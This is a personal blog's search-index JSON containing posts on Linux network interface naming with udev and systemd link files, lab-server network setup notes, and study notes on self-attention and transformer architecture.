{"meta":{"title":"Rick","subtitle":"we all in the gutter,but some of us still look the star.","description":null,"author":"LYC","url":"http://991688344.github.io","root":"/"},"pages":[{"title":"about","date":"2022-05-14","updated":"2024-03-19","comments":true,"path":"about/index.html","permalink":"http://991688344.github.io/about/index.html","excerpt":"","text":"","keywords":""},{"title":"categories","date":"2022-05-14","updated":"2024-03-19","comments":true,"path":"categories/index.html","permalink":"http://991688344.github.io/categories/index.html","excerpt":"","text":"","keywords":""},{"title":"link","date":"2022-05-14","updated":"2024-03-19","comments":true,"path":"link/index.html","permalink":"http://991688344.github.io/link/index.html","excerpt":"","text":"","keywords":""},{"title":"gallery","date":"2022-05-14","updated":"2024-03-19","comments":true,"path":"gallery/index.html","permalink":"http://991688344.github.io/gallery/index.html","excerpt":"","text":"","keywords":""},{"title":"tags","date":"2022-05-14","updated":"2024-03-19","comments":true,"path":"tags/index.html","permalink":"http://991688344.github.io/tags/index.html","excerpt":"","text":"","keywords":""},{"title":"","date":"2024-03-19","updated":"2024-03-19","comments":true,"path":"mycss/my_background.css","permalink":"http://991688344.github.io/mycss/my_background.css","excerpt":"","text":"/* 顶部搜索栏*/ #page-header.nav-visible #nav { background: transparent; } #page-header.nav-fixed #nav { background: transparent; } /* 主页字体*/ @font-face { font-family:'pixel'; src:url('/font/pixel/ChillPixels-Maximal.otf'); /* 修改成你的字体 */ font-display:swap } .full_page #site-title { font-family:pixel!important } .full_page #subtitle { font-family:pixel!important } a#site-name { font-family:pixel!important } /* #footer { background: transparent; } */ #footer { background: rgba(255,255,255,.15); color: #000; border-top-right-radius: 20px; border-top-left-radius: 20px; backdrop-filter: saturate(100%) blur(5px) } #footer::before { background: rgba(255,255,255,.15) } #footer #footer-wrap { color: var(--font-color) } #footer #footer-wrap a { color: var(--font-color) }","keywords":""},{"title":"messageboard","date":"2022-05-14","updated":"2024-03-19","comments":true,"path":"messageboard/index.html","permalink":"http://991688344.github.io/messageboard/index.html","excerpt":"","text":"","keywords":""}],"posts":[{"title":"udev配置Linux网络接口","date":"2023-08-27","updated":"2024-03-19","path":"2023/08/27/udev配置Linux网络接口/","text":"一致的网络接口设备命名 Linux 内核通过将固定前缀与随着内核初始化网络设备而增加的数字连接在一起，来为网络接口分配名称。例如，eth0 代表启动时被探测的第一个设备。如果您在系统中添加另一个网卡，则内核设备名称的分配将不再是固定的。因此，重启后内核可能会以不同的方式为该设备命名。 要解决这个问题，`udev` 设备管理器支持几种不同的命名方案。默认情况下，`udev` 根据固件、拓扑和位置信息分配固定名称。它有以下优点： 设备名称完全可预测。 即使添加或删除了硬件，设备名称也会保持不变，因为不会进行重新枚举。 因此，有问题的硬件可以被无缝地替换。 网络接口设备命名等级 ​ 如果启用了一致的设备命名（在 Red Hat Enterprise Linux 中是默认设置），则 udev 设备管理器会根据以下方案生成设备名称： 方案 描述 示例 1 设备名称包含固件或者 BIOS 提供的索引号，用于板上的设备。如果此信息不可用或不适用，则 udev 将使用方案 2。 eno1 2 设备名称包含固件或 BIOS 提供的 PCI Express（PCIe）热插件插槽索引号。如果此信息不可用或不适用，则 udev 将使用方案 3。 ens1 3 设备名称包含硬件连接器的物理位置。如果此信息不可用或不适用，则 udev 将使用方案 5。 enp2s0 4 设备名称包含 MAC 地址。Red Hat Enterprise Linux 默认不使用这个方案，但管理员可选择性地使用它。 enx525400d5e0fb 5 传统的无法预计的内核命名方案。如果 udev 无法应用任何其他方案，则设备管理器使用这个方案。 eth0 ​ 默认情况下，Red Hat Enterprise Linux 根据 /usr/lib/systemd/network/99-default.link 文件中的 NamePolicy 设置选择设备名称。NamePolicy 中值的顺序非常重要。Red Hat Enterprise Linux 使用文件中指定的和 udev 生成的第一个设备名称。 ​ 如果您手动配置 udev 规则来更改内核设备名称，则这些规则优先。 可以通过udevadm test /sys/class/net/eth0这个命令查看某个网卡使用了哪些命名规则。 网络设备重命名是如何工作的 ​ 默认情况下，在 Red Hat Enterprise Linux 中启用了一致的设备命名。udev 设备管理器会处理不同的规则来重命名设备。udev 服务按以下顺序处理这些规则： /usr/lib/udev/rules.d/60-net.rules 文件定义了 /lib/udev/rename_device 帮助工具搜索 /etc/sysconfig/network-scripts/ifcfg-* 文件中的 HWADDR 参数。如果变量中设置的值与接口的 MAC 地址匹配，则帮助工具会将接口重命名为文件的 DEVICE 参数中设置的名称。 /usr/lib/udev/rules.d/71-biosdevname.rules 文件定义了 biosdevname 工具根据其命名策略重命名接口，只要它在上一步中没有重命名。 /usr/lib/udev/rules.d/75-net-description.rules 文件定义了 udev 检查网络接口设备，并在 udev-internal 变量中设置在下一步中将要处理的属性。请注意，其中一些属性可能没有定义。 /usr/lib/udev/rules.d/80-net-setup-link.rules 文件调用内置的 net_setup_link udev ，然后应用策略。以下是存储在 /usr/lib/systemd/network/99-default.link 文件中的默认策略： 123[Link]NamePolicy=kernel database onboard slot pathMACAddressPolicy=persistent 有了这个策略，如果内核使用持久名称，则 udev 不会重命名接口。如果内核不使用持久名称，则 udev 会将接口重命名为 udev 的硬件数据库提供的名称。如果这个数据库不可用，Red Hat Enterprise Linux 会回复到上述机制中。 另外，对于基于介质访问控制（MAC）地址的接口名称，将此文件中的 NamePolicy 参数设为 mac。 /usr/lib/udev/rules.d/80-net-setup-link.rules 文件定义了 udev 按以下顺序，根据 udev-internal 参数重命名接口： ID_NET_NAME_ONBOARD ID_NET_NAME_SLOT ID_NET_NAME_PATH 如果没有设置参数，则 udev 将使用下一个参数。如果没有设置任何参数，接口就不会被重命名。 使用 udev 规则分配用户定义的网络接口名称 udev 设备管理器支持一组规则来自定义接口名称。 步骤 显示所有网络接口及其 MAC 地址： 12345678# ip link listenp6s0f0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether b4:96:91:14:ae:58 brd ff:ff:ff:ff:ff:ffenp6s0f1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether b4:96:91:14:ae:5a brd ff:ff:ff:ff:ff:ffenp4s0f0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 00:90:fa:6a:7d:90 brd ff:ff:ff:ff:ff:ff 使用以下内容创建文件 /etc/udev/rules.d/70-custom-ifnames.rules ： 123SUBSYSTEM==&quot;net&quot;,ACTION==&quot;add&quot;,ATTR&#123;address&#125;==&quot;b4:96:91:14:ae:58&quot;,ATTR&#123;type&#125;==&quot;1&quot;,NAME=&quot;provider0&quot;SUBSYSTEM==&quot;net&quot;,ACTION==&quot;add&quot;,ATTR&#123;address&#125;==&quot;b4:96:91:14:ae:5a&quot;,ATTR&#123;type&#125;==&quot;1&quot;,NAME=&quot;provider1&quot;SUBSYSTEM==&quot;net&quot;,ACTION==&quot;add&quot;,ATTR&#123;address&#125;==&quot;00:90:fa:6a:7d:90&quot;,ATTR&#123;type&#125;==&quot;1&quot;,NAME=&quot;dmz&quot; 这些规则与网络接口的 MAC 地址相匹配，并将它们重命名为 NAME 属性中指定的名称。在这些示例中，ATTR{type} 参数值 1 定义了接口类型为 Ethernet。 验证 重启系统： 1# reboot 验证每个 MAC 地址的接口名称是否与您在规则文件的 NAME 参数中设置的值相匹配： 1234567891011# ip link showprovider0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000 link/ether b4:96:91:14:ae:58 brd ff:ff:ff:ff:ff:ff altname enp6s0f0provider1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000 link/ether b4:96:91:14:ae:5a brd ff:ff:ff:ff:ff:ff altname enp6s0f1dmz: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000 link/ether 00:90:fa:6a:7d:90 brd ff:ff:ff:ff:ff:ff altname enp4s0f0 使用 systemd 链接文件分配用户定义的网络接口名称 ​ 通过将网络接口重命名为 provider0来创建一个命名方案。 流程 显示所有接口名称及其 MAC 地址： 12345678# ip link showenp6s0f0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether b4:96:91:14:ae:58 brd ff:ff:ff:ff:ff:ffenp6s0f1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether b4:96:91:14:ae:5a brd ff:ff:ff:ff:ff:ffenp4s0f0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000 link/ether 00:90:fa:6a:7d:90 brd ff:ff:ff:ff:ff:ff 创建 /etc/systemd/network/ 目录： 1# mkdir /etc/systemd/network/ 要将 MAC 地址为 b4:96:91:14:ae:58 的接口命名为 provider0，请创建包含以下内容的 /etc/systemd/network/70-custom-ifnames.link 文件： 12345[Match]MACAddress=b4:96:91:14:ae:58[Link]Name=provider0 此链接文件与 MAC 地址相匹配，并将网络接口重命名为 Name 参数中设置的名称。 验证 重启系统： 1# reboot 验证 MAC 地址为您在链接文件中指定的设备是否已分配给 provider0 ： 1234# ip link showprovider0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP mode DEFAULT group default qlen 1000 link/ether b4:96:91:14:ae:58 brd ff:ff:ff:ff:ff:ff 使用 systemd 链接文件向网络接口分配额外的名称 ​ 备用接口命名允许内核为网络接口设置备用名称。默认情况下，它提供与常规接口命名设置 - NamePolicy 相同的命名方案 。您可以使用 AlternativeNamesPolicy 或 AlternativeName 指令编写自定义 systemd 链接文件，来向您选择的网络接口提供备用名称。 ​ 备用接口命名的最新实现可让您： 创建任意长度的备用名称。 同一网络接口有一个或多个备用名称。 使用备用名称作为命令的句柄。 先决条件 您知道介质访问控制(MAC)地址或其他网络接口标识符。详情请查看 systemd.link(5) 中的 [MATCH] SECTION OPTIONS 部分。 流程 使用以下内容创建 /etc/systemd/network/10-altnames.link 文件： 123456[Match]MACAddress=52:54:00:76:e0:2a[Link]AlternativeName=production_alias_of_arbitrary_lengthAlternativeName=PRD 重启系统以使更改生效。 验证 您可以使用备用名称来显示网络接口的状态： 123456789# ip address show production_alias_of_arbitrary_length2: enp1s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000 link/ether 52:54:00:76:e0:2a brd ff:ff:ff:ff:ff:ff altname production_alias_of_arbitrary_length altname PRD inet 192.0.2.1/24 brd 192.0.2.255 scope global dynamic noprefixroute enp1s0 valid_lft 2760sec preferred_lft 2760sec inet6 2001:db8::/64 scope link noprefixroute valid_lft forever preferred_lft forever Systemd is the rapidly evolving mother-ship of Linux initialisation systems (and rather more besides) and one that most popular distributions now use (in recent versions at least) including RHEL, Fedora, CentOS, Debian, Ubuntu, Arch, and CoreOS. This brings us some degree of ‘standardization’ in how we configure networking on these distributions. It’s not complete and it’s a work in progress, but it surely is progress. Systemd 是 Linux 初始化系统（以及更多其他系统）快速发展的母舰，也是现在最流行的发行版（至少在最近的版本中）使用的系统，包括 RHEL、Fedora、CentOS、Debian、Ubuntu、Arch 和 CoreOS。这给我们在这些发行版上配置网络的方式带来了一定程度的“标准化”。它尚未完成，仍在进行中，但它确实是进步。 Systemd first touches the networking stack in relation to hardware, with the udev device manager, the core library of which was merged into systemd in 2012 (it used to be a separate project). You can do pretty much everything you’d want with a network interface using udev, but it’s jarring if you are used to the legacy configuration methods and it seems rather odd to be configuring IP addressing in a hardware device configuration file, thus systemd-networkd was born. I’ll cover networkd in a following piece, but suffice to say it deals with things in a more logical, better-defined way. Why cover udev at all then? Well, networkd is pretty new and it’ll be a while before it’s widespread so for now, udev is probably the best thing most have at their disposal and it’s still very useful. Systemd 首先通过 udev 设备管理器触及与硬件相关的网络堆栈，其核心库于 2012 年合并到 systemd 中（它曾经是一个单独的项目）。你可以使用 udev 通过网络接口做几乎所有你想做的事情，但是如果你习惯了传统的配置方法，那么它会很不和谐，并且在硬件设备配置文件中配置 IP 寻址似乎很奇怪，因此 systemd-networkd出生于。我将在下一篇文章中介绍网络，但足以说明它以更逻辑、更明确的方式处理事物。那么为什么要覆盖 udev 呢？嗯，网络是相当新的东西，它还需要一段时间才能广泛使用，所以就目前而言，udev 可能是大多数人可以使用的最好的东西，而且它仍然非常有用。 In essence, you can run any command you’d like to use to configure the interface via udev, such as ethtool, ip and dhclient. Better yet, consistent network device naming is fully supported and you don’t need to rely on MAC addresses for identification (despite the numerous examples you’ll find via Google). I’m not aware of any Network Operating Systems (NOSs) using systemd at present, but I’m sure it’s in the pipeline so I’ll continue and anyway, we all need to be silo free and multi-disciplinary right? 本质上，您可以运行任何您想用来通过 udev 配置接口的命令，例如 ethtool、ip 和 dhclient。更好的是，完全支持一致的网络设备命名，并且您不需要依赖 MAC 地址进行识别（尽管您可以通过 Google 找到大量示例）。我目前不知道有任何网络操作系统 (NOS) 使用 systemd，但我确信它正在酝酿之中，所以我会继续，无论如何，我们都需要摆脱孤岛和多学科，对吗？ Remove Network Manager You might not even know it’s in use, but Network Manager can conflict with udev in strange and unusual ways so I prefer to simply remove it. This isn’t strictly required and may not be necessary but if you hit problems, its an extra complication. Be aware that doing so will probably result in the host losing all network connectivity on reboot if udev encounters an error, but hey, we’re just doing this on a vm right? Here’s a few examples of how to do so, depending on your distribution (further suggestions welcome): 您甚至可能不知道它正在使用，但网络管理器可能会以奇怪和不寻常的方式与 udev 发生冲突，因此我更愿意简单地将其删除。这不是严格要求的，也可能不是必要的，但如果你遇到问题，那就会变得更加复杂。请注意，如果 udev 遇到错误，这样做可能会导致主机在重新启动时丢失所有网络连接，但是嘿，我们只是在虚拟机上执行此操作，对吧？以下是一些如何执行此操作的示例，具体取决于您的发行版（欢迎进一步建议）： Consistent Network Device Naming The bane of Linux for many a year, physical network interfaces were typically named and numbered based on the order in which the kernel detected them, which could be change on each boot. Imagine a switch randomly assigning different numbers to its physical interfaces on each boot. Fine if they are all configured the same, far from it if not. This issue was resolved around 2012 with the fairly widespread implementation of the biosdevname module, based on a standard created in 2009. Things were slower back then right? As I’ve mentioned, most examples I’ve seen when searching using Google and others seem to rely on matching the interface using its MAC address. This seems to be at odds with the whole point of consistent naming and won’t work well with vm images, Vagrant or containers. Of course, with embedded interfaces on physical servers it’s not a problem because the MAC will never change. 正如我所提到的，我在使用 Google 和其他搜索时看到的大多数示例似乎都依赖于使用 MAC 地址来匹配接口。这似乎与一致命名的整体要点相矛盾，并且不能很好地与 vm 镜像、Vagrant 或容器配合使用。当然，对于物理服务器上的嵌入式接口来说，这不是问题，因为 MAC 永远不会改变。 The match is used by udev to identify an interface to be configured, just to reiterate, it’s specified in this file: 1/etc/udev/rules.d/70-persistent-net.rules It’s taken me an age to find an alternative but the PCI bus identifier seems rather more reliable than a MAC address. You can find out what it is by using this command (you’ll probably have to install the pciutils package to make this command available): 我花了很长时间才找到替代方案，但 PCI 总线标识符似乎比 MAC 地址更可靠。您可以使用此命令找出它是什么（您可能必须安装 pciutils 软件包才能使此命令可用）： 1lspci Here’s what the output looks like with a embedded interface on physical servers: 1200:19.0 Ethernet controller: Intel Corporation Ethernet Connection (2) I218-LM (rev 05)08:00.0 Ethernet controller: Intel Corporation I210 Gigabit Network Connection (rev 03) We can now use the data with an entry in the file like this: 1SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, KERNELS==&quot;0000:08:00.0&quot;, NAME==&quot;ethlab2&quot; To set the speed and duplex (scroll right): 1SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, KERNELS==&quot;0000:08:00.0&quot;, NAME==&quot;ethlab&quot;, RUN+=&quot;/sbin/ethtool -s &#x27;%k&#x27; speed 100 duplex full autoneg off&quot; ‘%k’ Is a variable that represents the device name udev has given to the network interface. I know we’ve called it bingo already, but even if our ‘rename’ fails, the ethtool and ip link commands will still succeed. ‘%k’ 是一个变量，表示 udev 赋予网络接口的设备名称。我知道我们已经将其称为 ethlab，但即使我们的“重命名”失败，ethtool 和 ip link 命令仍然会成功。 Let’s make use of DHCP too (and log things verbosely with -v): 1SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, KERNELS==&quot;0000:08:00.0&quot;, NAME==&quot;ethlab&quot;, RUN+=&quot;/sbin/ethtool -s &#x27;%k&#x27; speed 100 duplex full autoneg off&quot;, RUN+=&quot;/sbin/ip link set mtu 1400 dev &#x27;%k&#x27;&quot;, RUN+=&quot;dhclient -v &#x27;%k&#x27;&quot; Testing You can force a reload of udevd and its functions with this command: 1systemctl restart systemd-udevd Note that if you’ve manually reconfigured an interface handled by udev, this will revert those changes if the settings in question are specified in a valid .rules file. Also note that restarting udev will not bring an interface UP if it has been manually set to DOWN and there is no command to bring it UP in a valid .rules file. A reboot however, will. 请注意，如果您手动重新配置了由 udev 处理的接口，并且在有效的 .rules 文件中指定了相关设置，则这将恢复这些更改。另请注意，如果已手动将接口设置为 DOWN 并且在有效的 .rules 文件中没有命令将其恢复为 UP，则重新启动 udev 不会将其恢复为 UP。然而，重新启动就会。 You can also ‘test’ changes using this command, but I’ve found this isn’t too helpful (perhaps I’m wrong): 1udevadm test /sys/class/net/eth0 | less Logging The logging level for udev can be controlled by editing this configuration file: /etc/udev/udev.conf like so: 1dev_log=&quot;info&quot; #Change to err, debug etc. or a syslog number as required You can inspect the log entries generated by udev using this command (-b restricts things to boot time entries, remove it if you want everything): 1journalctl -b |grep udev Debug 所有配置文件： 12/usr/lib/udev/rules.d//etc/udev/rules.d/ 1sudo vim /etc/udev/rules.d/10-local.rules 123#SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, KERNELS==&quot;0000:08:00.0&quot;, NAME==&quot;ethlab2&quot;SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, ATTR&#123;address&#125;==&quot;fc:4d:d4:3e:cd:2d&quot;,ATTR&#123;type&#125;==&quot;1&quot;, NAME=&quot;ethlab&quot; 查看某个网络设备的信息 1sudo udevadm test /sys/class/net/eth0 列出某个设备的所有属性 1udevadm info -ap /devices/pci0000:00/0000:00:1c.2/0000:08:00.0/net/eth0 12sudo systemctl restart systemd-udevd &amp;&amp; sudo systemctl status systemd-udevdsudo udevadm control --reload-rules &amp;&amp; sudo udevadm trigger 1journalctl -b |grep udev Linux Network Interface Configuration With udev Chapter 1. Consistent network interface device naming Change “eth0” interface name and reload udev rules without a reboot What is wrong with my udev rule? 在Linux中如何编写基本的udev规则 Predictable Network Interface Names 使用 biosdevname 的一致网络设备命名"},{"title":"实验室服务器网络运维","date":"2023-08-27","updated":"2024-03-19","path":"2023/08/27/实验室服务器网络运维/","text":"1. 网卡重命名 Linux 内核通过将固定前缀与随着内核初始化网络设备而增加的数字连接在一起，来为网络接口分配名称。例如，eth0 代表启动时被探测的第一个设备。如果您在系统中添加另一个网卡，则内核设备名称的分配将不再是固定的。因此，重启后内核可能会以不同的方式为该设备命名。 要解决这个问题，`udev` 设备管理器支持几种不同的命名方案。默认情况下，`udev` 根据固件、拓扑和位置信息分配固定名称。它有以下优点： 设备名称完全可预测。 即使添加或删除了硬件，设备名称也会保持不变，因为不会进行重新枚举。 因此，有问题的硬件可以被无缝地替换。 查看某个网络设备的信息 1sudo udevadm test /sys/class/net/ethlab 列出某个设备的所有属性 1udevadm info -ap /devices/pci0000:00/0000:00:1c.2/0000:08:00.0/net/ethlab 修改配置文件 根据上面查询的设备属性来匹配具体的设备，然后重命名。 所有配置文件目录如下: 12/usr/lib/udev/rules.d//etc/udev/rules.d/ 修改自定义配置文件： 1sudo vim /etc/udev/rules.d/10-local.rules 1SUBSYSTEM==&quot;net&quot;, ACTION==&quot;add&quot;, ATTR&#123;address&#125;==&quot;fc:4d:d4:3e:cd:2d&quot;,ATTR&#123;type&#125;==&quot;1&quot;, NAME=&quot;ethlab&quot; 重新加载（不管用，还是要重启） 12sudo systemctl restart systemd-udevd &amp;&amp; sudo systemctl status systemd-udevdsudo udevadm control --reload-rules &amp;&amp; sudo udevadm trigger 查看相关日志 1journalctl -b |grep udev 2. 配置NetworkManager固定IP地址 在图形化页面配置了固定IP相关信息之后，在/etc/NetworkManager/system-connections/目录下生成相关配置文件，其中有UUID，nmcli命令可以查看哪个配置文件绑定了哪个网络设备。 1sudo vim /etc/NetworkManager/system-connections/ethlab.nmconnection 3. 配置锐捷自动登录服务 1sudo vim /etc/systemd/system/netConnect.service 12345678910111213[Unit]Description=RG net connect Service#After=network.target#After=NetworkManager.serviceAfter=network-manager.serviceWants=network.target[Service]Type=simpleRestart=alwaysRestartSec=5sExecStart=/opt/RG_supplicant/rjsupplicant.sh -n ethlab[Install]WantedBy=multi-user.target 4. clash &amp; sunlogin 这两个服务都启动图形化页面，所以在图形化页面中可以运行如下命令来配置。 1gnome-session-properties 运行之后会在~/.config/autostart/目录下生成相关配置文件 1vim ~/.config/autostart/cfw.desktop 12345678[Desktop Entry]Type=ApplicationVersion=0.20.25Name=Clash for WindowsComment=Clash for Windows startup scriptExec=&quot;/opt/clash/cfw&quot;StartupNotify=falseTerminal=false 1vim ~/.config/autostart/sunloginclient.desktop 12345678910[Desktop Entry]Type=ApplicationExec=/usr/local/sunlogin/bin/sunloginclientHidden=falseNoDisplay=falseX-GNOME-Autostart-enabled=trueName[zh_CN]=sunloginclientName=sunloginclientComment[zh_CN]=Auto start sunlogin uiComment=Auto start sunlogin ui Linux Network Interface Configuration With udev Chapter 1. Consistent network interface device naming Change “eth0” interface name and reload udev rules without a reboot What is wrong with my udev rule? 在Linux中如何编写基本的udev规则 Predictable Network Interface Names 使用 biosdevname 的一致网络设备命名"},{"title":"Attention机制_transformer","date":"2022-11-21","updated":"2024-03-19","path":"2022/11/21/Attention机制-transformer/","text":"self-Attention 用Q来找相关的K 计算新的具有注意力信息词汇的过程 self att的 两种不同的架构 这是计算两个word的注意力分数，WWW矩阵为一个transformer 第一个词分别和其它所有词做注意力分数计算（包括自己），最后把分数进行softmax得到最终分数 ​ WqW_qWq​相当于查询矩阵， WkW_kWk​ 相当与键值矩阵，WvW_vWv​ 相当于获取原始值矩阵。这三个矩阵都是共用的，这三个矩阵来控制这几个词的互相的注意力大小 ​ 每个词用WqW_qWq​获取自己的向量，WkW_kWk​获取被查询词的向量，两向量进行点乘–&gt; softmax后得到相似度（注意力）分数。最后这个查询的词利用获取到的所有与其他词的注意力分数和WvW_vWv​获取的原始值分别相乘后相加得到一个新的向量。 ​ 这个词的新向量就包含了其它所有词的联系信息，并且联系强弱不同，即所谓的自注意力。 计算b1b_1b1​过程 计算b2b_2b2​过程 矩阵乘法角度 既然WqW_qWq​ WkW_kWk​ WvW_vWv​ 都是共享的，那么计算qiq^iqi kik^iki viv^ivi 就可以用矩阵乘法来一次性并行计算出来 1. 计算qkvqkvqkv 2. 计算注意力分数 每个词汇的q，分别乘其他矩阵的k，来得到与其他词的注意力分数 3. 计算新的包含注意力信息的词汇 注意力分数和原始词汇通过WvW_vWv​ transformer后相乘得到最终的新词汇 4. 总过程 只有WqW_qWq​ WkW_kWk​ WvW_vWv​是需要学习的，这三个控制所有的相互之间的注意力大小 Multi-head Self-attention 自注意力就是用Q来找相关的K，但是“相关”会有很多种不同的种类不同的形式，所以需要多个Q来找不同形式的相关。 计算b1的不同形式的注意力结果 qi,1q^{i,1}qi,1与vi,1v^{i,1}vi,1一起算，qi,2q^{i,2}qi,2与vi,2v^{i,2}vi,2一起算 最后把这个词的不同形式注意力结果拼接起来乘上最终的一个transformer WoW_oWo​ 得到这个词汇的最终注意力结果 Positional Encoding 以上说的self attention虽然包含了其他词汇的注意力信息，但是少了个非常重要的信息–位置信息。 比如“saw a saw”这个句子中两个“saw”谁前谁后 前面提到的self attention并不知道。 不同的位置都有一个位置vector eie^iei self-Attention 在图像领域应用 f(x),g(x),h(x)就是 QKV 1. Self-Attention VS CNN 如果把图片做inner poduct的时候，如下图 A处的像素做Query，B处的像素做Key，每个像素考虑的就不是和CNN一样在卷积核的小范围内了，而是考虑的全局信息，所以CNN可以说是一个self-ATT的简化版本。 CNN的receptive field是认为划定的，而self-ATT的receptive field是自动学习出来的。 下面的论文用数学的方式证明CNN就是self-attention的子集。 CNN适用于数据集少的情况，不容易过拟合 2. Self-Attention VS RNN 关键的区别就是RNN的词汇要和离着非常远的词汇建立联系的话，会存在梯度消失的现象，难以训练，而Self-Attention不存在这样的问题 而且RNN无法并行处理所有数据 3. Self-Attention for graph 在之前的网络中，每个词汇之间有没有关联是自己学习出来的，但是在图里面，点之间的关联信息已经给出了，只需要计算有关联的点之间的注意力分数就够了。 Transformer https://www.bilibili.com/video/BV1Xp4y1b7ih?p=3&amp;vd_source=a61337b33cfc68a14ecb4713a0602ea5 transformer 是个seq2seq的model seq2seq有几种情况，一对一、多对一、多对多、输出长度不固定 需要网络自己学习，例如语音识别和翻译 输入长度和输出长度之间的关系不是固定的 1. transformer架构 有一个编码架构，有个解码架构 2. Encoer部分 作用就是给一排向量 ，输出另一排向量（包含注意力信息）。可以用CNN、RNN、Self-Attention做，Transformer里面用的是Self-Attention 每个Encoder里面都有很多 block（对应上图中的Nx块） 每个block都是先经过Self-Attention（对应Multi-Head Attention）然后再FC（对应 Feed Forward） 在block里面还加入了残差的思想：经过self-Att 和FC 后先和原输入残差连接（对应Add），然后在进行Layer Normal（对应Norm） 注意这里的normal是layer normal 不是 batch nomral To learn more 以上是原论文中用到的结构，也有很多改进版本： 第一篇文章讨论了layer Norm的位置在哪更合适 第二篇文章讨论了什么Normalization更好 3. Decoder Autoregressive 依次产生每个词 整体过程 在Decoder中，首先把Encoder的输出先读入（具体怎么读入的先不展开） 首先定义两个特殊的符号BOS(Begin of Sentence)、EOS(End of Sentence) Decoder类似于RNN，先根据输入生成第一个词汇 然后将这个词汇作为下一步的输入 … … 这里存在一个问题就是会存在错误传播的问题，即一步错，步步错 详细结构 如果把Decoder中间这部分遮住，则Encoder、Decoder两个差不多 Masked Self-Attention 区别在Decoder中有个Masked，那这个Masked是什么意思呢： 在原始的Self-Att中，每一步的输入都会考虑到后面所有步的输入 在Masked Self-attention中，当前词汇的产生不能考虑后面的部分 因为Decoder中是一个一个输出的，当前时刻并不会获得之后时刻的信息 ps：Encoder是根据全部信息训练出来的，那么Decoder这样做会不会“不对称” ？如果实时性要求不是特别高的话，那是不是可以设置一个窗口来让当前时刻学习一下窗口长度的之后时刻的信息？ 为了让Decoder可以停下，还需要设置一个特殊符号EOS。 Non-Autoregressive (NAT) 一次产生所有词 4. Encoder-Decoder之间的传递 Decoder将输入进行Att后得到的结果当作Query，Encoder中的输出作为Key、Value进行计算 下面是使用seq2seq做语音识别的文章，使用到了Cross Att思想 首先上面的声音列向量输入到Encoder中，然后decoder输出与Encoder输出做cross Att 5. Learn To more 6. Training 在训练的时候会给Decoder看正确答案，也就是告诉Decoder 输入BEGIN时候要输出机，输入机的时候要输出器 … …。 这种技术为Teacher Forcing 但是现在有个问题就是Decoder在训练过程中看到的是正确答案。真正在使用的过程中没有正确答案可以看，这其中存在一个Mismatch 这就可能导致一步错 步步错的问题 解决方法之一就是在训练过程中给Decoder加一些错误的标签，类似于加噪声，正则化 这种技术叫做 Scheduled Sampling 评估 在训练时后的损失是单个词汇的，而评估的时候是评估整个句子 那能不能training的时候就考虑整个句子呢，即training的时候使用的就是BLEU loss呢？ 可以，但是BLEU本身是很复杂，是不能微分的。 Trick 遇到无法 optimization的LOSS，用RL硬Train一发就对了，把它当作是RL的 Guided Attention 强迫机器把输入的每个东西都“看到” To Learn more 自注意力与交叉注意力 交叉注意力 在交叉注意力中，每个输入序列都有自己的查询向量，而输出序列的每个位置都有一个键向量。当进行交叉注意力计算时，模型会根据查询向量和键向量之间的相似度来分配权重，从而决定要将哪些信息纳入到当前位置的计算中。 这种权重的分配过程可以被看做是对每个输入序列中的每个位置进行的关注度量，因此我们可以通过观察这些关注度量来理解模型在进行推断时关注了哪些输入位置，并进一步解释模型的决策原因。 此外，在交叉注意力中，我们还可以通过可视化注意力权重矩阵来进一步解释模型的决策原因，并理解哪些输入特征对于推断结果的产生起到了决定性的作用。 因此，交叉注意力在深度学习模型中具有较好的可解释性，可以帮助我们更好地理解模型的决策过程和推断结果。 交叉注意力为什么可以同时关注多个输入序列之间的依赖关系 交叉注意力可以同时关注多个输入序列之间的依赖关系的原因在于： 分别计算多个输入序列的查询向量，以及一个输出序列（假定要根据这些输入序列得到该输出序列），然后将多个查询向量联系在一起，以便同时考虑到所有输入序列与输出序列之间的关系。 在计算注意力权重时，会同时计算多个输入序列和输出序列之间的相似度，以便于获取每个输入序列的特征，然后将它们组合起来。 在每个时刻，交叉注意力都可以计算多个输入序列当前位置的特征向量，然后加权求和得到一个位置无关的向量表示。这个向量用于计算输出序列的下一个位置。 因此，交叉注意力通过对多个输入序列的特征进行编码以及计算它们与输出序列之间的相似度，可以同时关注多个输入序列之间的依赖关系，并且根据它们进行更好的推理和预测。它可以应用于一些需要对多个输入序列进行建模的任务，如机器翻译、图像描述等。 区别 https://datascience.stackexchange.com/questions/49468/whats-the-difference-between-attention-vs-self-attention-what-problems-does-ea https://machinelearningmastery.com/the-transformer-attention-mechanism/ 自注意力机制和交叉注意力机制都是注意力机制，在深度学习中都被广泛应用于序列建模任务中，但它们之间也存在一些明显的区别。 输入的不同：自注意力机制仅关注单个输入序列的不同位置之间的依赖关系，而交叉注意力机制可以同时关注多个输入序列之间的依赖关系。 